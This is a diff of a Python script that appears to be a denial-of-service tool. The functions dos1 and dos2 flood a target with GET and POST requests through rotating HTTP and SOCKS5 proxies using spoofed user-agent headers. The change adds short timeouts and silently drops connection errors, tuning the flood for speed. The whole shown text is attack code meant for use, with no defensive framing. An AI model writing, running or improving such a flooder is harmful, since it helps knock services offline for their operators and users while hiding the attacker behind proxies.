@@ -6,8 +6,6 @@ import cfscrape
 import os
 import pyAesCrypt
 
-xxxx = 0
-
 os.system("clear")
 
 with open('useragent') as file:
@@ -50,13 +48,13 @@ def dos1(target):
             'https': f'socks5://{proxyagentsocks}'
         }
         try:
-            requests.get(target, headers=header, proxies=proxieshttp)
-            requests.post(target, headers=header, proxies=proxieshttp)
-            requests.get(target, headers=header2, proxies=proxiessocks)
-            requests.post(target, headers=header2, proxies=proxiessocks)
+            requests.get(target, headers=header, proxies=proxieshttp, timeout=1)
+            requests.post(target, headers=header, proxies=proxieshttp, timeout=1)
+            requests.get(target, headers=header2, proxies=proxiessocks, timeout=1)
+            requests.post(target, headers=header2, proxies=proxiessocks, timeout=1)
         except:
-            xxxx = xxxx + 1
-            print("Connection error (" + xxxx + ")")
+            pass
+          
 
 
 def dos2(target):
